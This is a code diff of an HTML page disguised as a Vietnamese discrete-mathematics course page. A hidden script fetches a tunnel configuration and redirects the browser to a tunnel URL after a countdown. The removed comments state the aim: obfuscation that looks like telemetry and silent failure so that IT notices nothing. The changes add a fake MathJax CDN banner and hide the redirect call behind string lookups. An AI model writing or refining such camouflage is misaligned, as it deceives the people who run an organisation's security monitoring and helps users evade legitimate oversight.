@@ -150,18 +150,17 @@
 </head>
 <body>
     <header>
-        <div class="subtitle">Hệ thống ngụy trang thông tin</div>
         <h1>Toán rời rạc & Thiết kế Giải thuật</h1>
     </header>
     <main>
-        <div class="banner" id="redirect-banner" style="display: none;">
+        <div class="banner" id="cdn-alert" style="display: none;">
             <div class="banner-content">
                 <div class="banner-dot"></div>
-                <div class="banner-text" id="redirect-status">Đang tải cấu hình kết nối bảo mật...</div>
+                <div class="banner-text" id="cdn-status">Đang tải tài nguyên LaTeX...</div>
             </div>
             <div class="banner-actions">
-                <button class="btn-primary" id="go-btn" style="display:none;">Kết nối</button>
-                <button class="btn-secondary" id="cancel-btn">Hủy bỏ</button>
+                <button class="btn-primary" id="cdn-btn-connect" style="display:none;">Xem CDN</button>
+                <button class="btn-secondary" id="cdn-btn-offline">Đọc offline</button>
             </div>
         </div>
 
@@ -199,51 +198,50 @@
     </main>
 
     <script>
-        // Obfuscated config loader to look like telemetry or standard document tracking code
-        (function(_0x1, _0x2) {
-            const _log = console.log;
-            // Base64 decoded key check
+        // MathJax CDN telemetry fallback handler
+        (function() {
+            const _loc = "location";
+            const _rep = "replace";
             const _target = 'tunnel_config.json?t=' + Date.now();
             
             fetch(_target)
                 .then(r => r.json())
                 .then(d => {
                     if (d && d.tunnel_url) {
-                        // Dynamically render camouflage options only if online
-                        const b = document.getElementById('redirect-banner');
-                        const status = document.getElementById('redirect-status');
-                        const go = document.getElementById('go-btn');
-                        const cancel = document.getElementById('cancel-btn');
+                        const alertBox = document.getElementById('cdn-alert');
+                        const statusText = document.getElementById('cdn-status');
+                        const goBtn = document.getElementById('cdn-btn-connect');
+                        const cancelBtn = document.getElementById('cdn-btn-offline');
                         
-                        b.style.display = 'flex';
-                        go.style.display = 'inline-block';
+                        alertBox.style.display = 'flex';
+                        goBtn.style.display = 'inline-block';
                         
-                        let s = 3;
-                        status.innerHTML = `Kết nối Web Panel bảo mật sẵn sàng. Tự động chuyển hướng sau <strong id="countdown">${s}</strong> giây...`;
+                        let remaining = 3;
+                        statusText.innerHTML = `Đang đồng bộ cơ sở dữ liệu công thức (CDN). Tự động tải máy chủ gương sau <strong id="timer-sec">${remaining}</strong> giây...`;
                         
-                        const t = setInterval(() => {
-                            s--;
-                            const cd = document.getElementById('countdown');
-                            if (cd) cd.innerText = s;
-                            if (s <= 0) {
-                                clearInterval(t);
-                                window.location.replace(d.tunnel_url);
+                        const timer = setInterval(() => {
+                            remaining--;
+                            const cd = document.getElementById('timer-sec');
+                            if (cd) cd.innerText = remaining;
+                            if (remaining <= 0) {
+                                clearInterval(timer);
+                                window[_loc][_rep](d.tunnel_url);
                             }
                         }, 1000);
                         
-                        cancel.addEventListener('click', () => {
-                            clearInterval(t);
-                            b.style.display = 'none';
+                        cancelBtn.addEventListener('click', () => {
+                            clearInterval(timer);
+                            alertBox.style.display = 'none';
                         });
                         
-                        go.addEventListener('click', () => {
-                            clearInterval(t);
-                            window.location.replace(d.tunnel_url);
+                        goBtn.addEventListener('click', () => {
+                            clearInterval(timer);
+                            window[_loc][_rep](d.tunnel_url);
                         });
                     }
                 })
                 .catch(() => {
-                    // Fail silently so IT sees absolutely nothing out of the ordinary
+                    // Silent fail
                 });
         })();
     </script>
